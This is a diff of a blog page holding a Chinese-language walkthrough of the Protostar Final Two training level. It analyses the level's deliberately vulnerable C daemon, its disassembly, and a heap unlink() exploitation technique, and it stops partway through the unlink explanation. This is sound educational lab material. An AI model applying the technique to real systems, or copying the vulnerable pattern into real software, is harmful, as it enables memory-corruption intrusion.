@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
-    <head>
-	<meta name="generator" content="Hugo 0.94.2" /><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Welcome to Rokkenjima'><title>Senri&#39;s Memos</title>
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Protostar Final 2 Walkthrough'><title>Protostar Final 2 Walkthrough</title>
 
-<link rel='canonical' href='/'>
+<link rel='canonical' href='/p/protostar_final_2/'>
 
-<link rel="stylesheet" href="/scss/style.min.46f4bd7833d4596a6e839caf393b83bf3fede00131b473e260f83d5a9f629895.css"><meta property='og:title' content='Senri&#39;s Memos'>
-<meta property='og:description' content='Welcome to Rokkenjima'>
-<meta property='og:url' content='/'>
+<link rel="stylesheet" href="/scss/style.min.46f4bd7833d4596a6e839caf393b83bf3fede00131b473e260f83d5a9f629895.css"><meta property='og:title' content='Protostar Final 2 Walkthrough'>
+<meta property='og:description' content='Protostar Final 2 Walkthrough'>
+<meta property='og:url' content='/p/protostar_final_2/'>
 <meta property='og:site_name' content='Senri&#39;s Memos'>
-<meta property='og:type' content='website'><meta property='og:updated_time' content=' 2022-04-18T00:00:00&#43;00:00 '/>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-04-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-18T00:00:00&#43;00:00'/><meta property='og:image' content='/p/protostar_final_2/cover.png' />
 <meta name="twitter:site" content="@kurususenri">
-    <meta name="twitter:creator" content="@kurususenri"><meta name="twitter:title" content="Senri&#39;s Memos">
-<meta name="twitter:description" content="Welcome to Rokkenjima"><link rel="alternate" type="application/rss&#43;xml" href="/index.xml">
+    <meta name="twitter:creator" content="@kurususenri"><meta name="twitter:title" content="Protostar Final 2 Walkthrough">
+<meta name="twitter:description" content="Protostar Final 2 Walkthrough"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/p/protostar_final_2/cover.png' />
     <link rel="shortcut icon" href="favicon.ico" />
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-KT4W9WZKC8"></script>
@@ -28,7 +28,9 @@ if (!doNotTrack) {
 </script>
 
     </head>
-    <body class="">
+    <body class="
+    article-page
+    ">
     <script>
         (function() {
             const colorSchemeKey = 'StackColorScheme';
@@ -229,15 +231,7 @@ if (!doNotTrack) {
     </ol>
 </aside>
 <main class="main full-width">
-    
-    
-    
-    
-
-    <section class="article-list">
-        
-            
-<article class="has-image">
+    <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
             <a href="/p/protostar_final_2/">
@@ -307,301 +301,731 @@ if (!doNotTrack) {
     
 </div>
 </header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://github.com/KurusuSenri/protostar_solutions/"  target="_blank" rel="noopener"
+    >☞ 最终的 Ruby 脚本放在了这里</a></p>
+<hr>
+<h2 id="final-two">Final Two</h2>
+<p><a class="link" href="https://exploit.education/protostar/final-two/"  target="_blank" rel="noopener"
+    >☞ Protostar Final Two</a></p>
+<blockquote>
+<p>Remote heap level :)</p>
+<p>Core files will be in /tmp.</p>
+<p>This level is at /opt/protostar/bin/final2</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;../common/common.c&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;../common/malloc.c&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define NAME &#34;final2&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define UID 0
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define GID 0
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define PORT 2993
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define REQSZ 128
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">check_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">  * Work out old software bug
+</span></span></span><span class="line"><span class="cl"><span class="cm">  */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;ROOT&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">printf</span><span class="p">(</span><span class="s">&#34;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl">          <span class="s">&#34;yes&#34;</span> <span class="o">:</span> <span class="s">&#34;no&#34;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">dll</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;FSRD&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;Process OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&#34;Process OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Run the process as a daemon */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Wait for socket activity and return */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">get_requests</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
+<p>首先很奇怪的&hellip;.在 <code>int get_requests(int fd)</code> 中，出现了 <code>free(destroylist[i]);</code>，但是 <code>destroylist[]</code> 到底存了什么东西，并没有任何地方提到&hellip;.</p>
+<p>因为给的源码和 gdb 二进制文件出来的东西不一样&hellip;</p>
+<p>谢谢，有被坑到x</p>
+<blockquote>
+<p>这里记一些 Radare2 的基本用法&hellip;</p>
+<p>analyze all: <code>aa</code></p>
+<p>seek to function: <code>s sym.get_requests</code></p>
+<p>enter visual mode: <code>V</code></p>
+<p>show function disassembly: <code>pdf</code></p>
+<p>rename variable: <code>afvn your_name var_xxxxh</code></p>
+<p>虽然我记了，但我还是用了 gdb x</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel 
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> disassemble get_requests
+</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> get_requests:
+</span></span><span class="line"><span class="cl">0x0804bd47 &lt;get_requests+0&gt;:	push   ebp
+</span></span><span class="line"><span class="cl">0x0804bd48 &lt;get_requests+1&gt;:	mov    ebp,esp
+</span></span><span class="line"><span class="cl">0x0804bd4a &lt;get_requests+3&gt;:	sub    esp,0x428
+</span></span><span class="line"><span class="cl">0x0804bd50 &lt;get_requests+9&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0x0
+</span></span><span class="line"><span class="cl">0x0804bd57 &lt;get_requests+16&gt;:	cmp    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0xfe
+</span></span><span class="line"><span class="cl">0x0804bd5e &lt;get_requests+23&gt;:	jg     0x804bddb &lt;get_requests+148&gt;
+</span></span><span class="line"><span class="cl">0x0804bd60 &lt;get_requests+25&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x1
+</span></span><span class="line"><span class="cl">0x0804bd68 &lt;get_requests+33&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80
+</span></span><span class="line"><span class="cl">0x0804bd6f &lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
+</span></span><span class="line"><span class="cl">0x0804bd74 &lt;get_requests+45&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,eax
+</span></span><span class="line"><span class="cl">0x0804bd77 &lt;get_requests+48&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0x0804bd7a &lt;get_requests+51&gt;:	mov    edx,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
+</span></span><span class="line"><span class="cl">0x0804bd7d &lt;get_requests+54&gt;:	mov    DWORD PTR <span class="o">[</span>ebp+eax*4-0x414<span class="o">]</span>,edx
+</span></span><span class="line"><span class="cl">......
+</span></span></code></pre></div><p>对比一下源码的话可以推断出：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;get_requests+9&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0x0
+</span></span><span class="line"><span class="cl">而源码中出现：dll <span class="o">=</span> <span class="m">0</span> 
+</span></span><span class="line"><span class="cl">所以 ebp-0x10 <span class="o">=</span> dll
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;get_requests+25&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x1
+</span></span><span class="line"><span class="cl">&lt;get_requests+33&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80	
+</span></span><span class="line"><span class="cl">//--&gt; <span class="nv">0x80</span> <span class="o">=</span> <span class="nv">128</span> <span class="o">=</span> REQSZ
+</span></span><span class="line"><span class="cl">&lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
+</span></span><span class="line"><span class="cl">&lt;get_requests+45&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,eax
+</span></span><span class="line"><span class="cl">调用约定一般把 call 的返回值放到 eax 里，
+</span></span><span class="line"><span class="cl">而源代码中出现：buf <span class="o">=</span> calloc<span class="o">(</span>REQSZ, 1<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">所以 ebp-0x14 <span class="o">=</span> buf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
+</span></span><span class="line"><span class="cl">&lt;get_requests+45&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>,eax	
+</span></span><span class="line"><span class="cl">//--&gt; <span class="nv">buf</span> <span class="o">=</span> <span class="nv">eax</span> <span class="o">=</span> &lt;calloc&gt;<span class="err">&#39;</span>s <span class="k">return</span>
+</span></span><span class="line"><span class="cl">&lt;get_requests+48&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>	
+</span></span><span class="line"><span class="cl">//--&gt; <span class="nv">eax</span> <span class="o">=</span> dll
+</span></span><span class="line"><span class="cl">&lt;get_requests+51&gt;:	mov    edx,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>	
+</span></span><span class="line"><span class="cl">//--&gt; <span class="nv">edx</span> <span class="o">=</span> buf
+</span></span><span class="line"><span class="cl">&lt;get_requests+54&gt;:	mov    DWORD PTR <span class="o">[</span>ebp+eax*4-0x414<span class="o">]</span>,edx
+</span></span><span class="line"><span class="cl">//--&gt; <span class="o">[</span>ebp + eax*4 - 0x414<span class="o">]</span> <span class="o">=</span> edx
+</span></span><span class="line"><span class="cl">//--&gt; <span class="o">[</span>ebp - 0x414 + eax*4<span class="o">]</span> <span class="o">=</span> edx
+</span></span><span class="line"><span class="cl">//--&gt; <span class="o">[</span>ebp - 0x414 + dll*4<span class="o">]</span> <span class="o">=</span> buf
+</span></span><span class="line"><span class="cl">ebp - 0x414 看起来像是某个起始值...再加上 dll*4 <span class="o">(</span>int 数组一个值 4bytes<span class="o">)</span>
+</span></span><span class="line"><span class="cl">所以大概可以推断出源码是这样：
+</span></span><span class="line"><span class="cl">destroylist<span class="o">[</span>dll<span class="o">]</span> <span class="o">=</span> buf<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">即：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">dll</span> <span class="o">=</span> 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="o">(</span>1<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="o">(</span>dll &gt;<span class="o">=</span> 255<span class="o">)</span> break<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="nv">buf</span> <span class="o">=</span> calloc<span class="o">(</span>REQSZ, 1<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      destroylist<span class="o">[</span>dll<span class="o">]</span> <span class="o">=</span> buf<span class="p">;</span> //&lt;--就是这玩意，题目给的源码里根本没写
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="o">(</span>read<span class="o">(</span>fd, buf, REQSZ<span class="o">)</span> !<span class="o">=</span> REQSZ<span class="o">)</span> break<span class="p">;</span>
+</span></span><span class="line"><span class="cl">      .......
+</span></span></code></pre></div><p>另外，<code>void check_path(char *buf)</code> 里的那句 <code>printf</code> 也并没在汇编代码中出现&hellip;</p>
+<hr>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>这道题的关键在于 <code>void check_path(char *buf)</code> 中的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;ROOT&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="n">printf</span><span class="p">(</span><span class="s">&#34;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl">          <span class="s">&#34;yes&#34;</span> <span class="o">:</span> <span class="s">&#34;no&#34;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></div><p>程序的预期（只是举例）：</p>
+<pre tabindex="0"><code>buf = &#34;abcd/adcdROOT&#34;
+           ↑p = rindex(buf, &#39;/&#39;)
+            p = &#34;/adcdROOT&#34;
+            l = strlen(p) = 9
+buf = &#34;abcd/adcdROOT&#34;
+           ↑    ↑start
+           ↑while(*start != &#39;/&#39;) start--;
+
+memmove(start, p, l)
+</code></pre><p>也就是 <code>ROOT</code> 出现在 <code>/</code> 后面&hellip;但如果出现在了前面的话..?</p>
+<pre tabindex="0"><code>buf = &#34;abcdROOTadcd/&#34;
+                   ↑p = rindex(buf, &#39;/&#39;)
+                    p = &#34;/&#34;
+                    l = strlen(p) = 1
+buf = &#34;abcdROOTadcd/&#34;
+           ↑start
+←while(*start != &#39;/&#39;) start--; 减到不知道哪里去了x
+
+memmove(start, p, l)
+</code></pre><p>到这个地方我们大概就可以知道，可以利用这一点把 <code>start</code> 移动到当前栈帧向前的任意 <code>/</code>处，<code>memmove(start, p, l)</code></p>
+<p>然后再利用 <code>int get_requests(int fd)</code> 的 <code>free(destroylist[i])</code>！</p>
+<p>这就是那个 <code>unlink()</code> 的漏洞了，和 <a class="link" href="/p/protostar_heap_3" >Protostar Heap Three Walkthrough</a> 是同样的思路w</p>
+<hr>
+<h2 id="restriction">Restriction</h2>
+<p><code>int get_requests(int fd)</code> 中有两句很讨厌的话：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">destroylist</span><span class="p">[</span><span class="n">dll</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">      <span class="c1">//就是这两句
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;FSRD&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">      <span class="n">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>     
+</span></span><span class="line"><span class="cl">      <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></div><p>所以我们输入的字符串：</p>
+<ol>
+<li>必须得有 <code>REQSZ = 128 bytes</code> 个字符，否则 break</li>
+<li>必须以 <code>FSRD</code> 开头，否则 break</li>
+</ol>
+<p>以上两点不满足的话不会执行 <code>check_path(buf + 4)</code> 也就不会执行里面的那句 <code>memmove(start, p, l)</code>；也不会 <code>buf++</code> 然后被 <code>free()</code></p>
+<h2 id="unlink">Unlink</h2>
+<p>接下来就可以考虑一下 <code>unlink()</code> 了，先复习一下：</p>
+<p><img src="/p/protostar_final_2/unlink.png"
+	width="1364"
+	height="1206"
+	srcset="/p/protostar_final_2/unlink_hu024e824d3d83b4bf15fc9447887d5f49_174732_480x0_resize_box_3.png 480w, /p/protostar_final_2/unlink_hu024e824d3d83b4bf15fc9447887d5f49_174732_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="when unlink"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="113"
+		data-flex-basis="271px"
+	
+></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define unlink( P, BK, FD ) {           
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="mf">1.</span>    <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>		<span class="err">\</span>           
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span>    <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>		\
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span>    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>	<span class="err">\</span>                
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span>    <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>	<span class="err">\</span>                       
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><br>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>堆中一个已被 free 的 chunk 的模型</th>
+<th>指针（↑表示在一格的起始处）</th>
+<th>大小</th>
+<th>可以视作</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>prev_size</code></td>
+<td>↑ chunk begins (P)</td>
+<td>4 bytes</td>
+<td>P + 0x0</td>
+</tr>
+<tr>
+<td><code>size</code></td>
+<td></td>
+<td>4 bytes</td>
+<td>P + 0x4</td>
+</tr>
+<tr>
+<td><code>fd</code></td>
+<td>↑ mem begins</td>
+<td>4 bytes</td>
+<td>P + 0x8</td>
+</tr>
+<tr>
+<td><code>bk</code></td>
+<td></td>
+<td>4 bytes</td>
+<td>P + 0xc</td>
+</tr>
+</tbody>
+</table></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="err">→</span> <span class="n">P</span><span class="o">+</span><span class="mh">0xc</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="err">→</span> <span class="n">P</span><span class="o">+</span><span class="mh">0x8</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span> <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span>
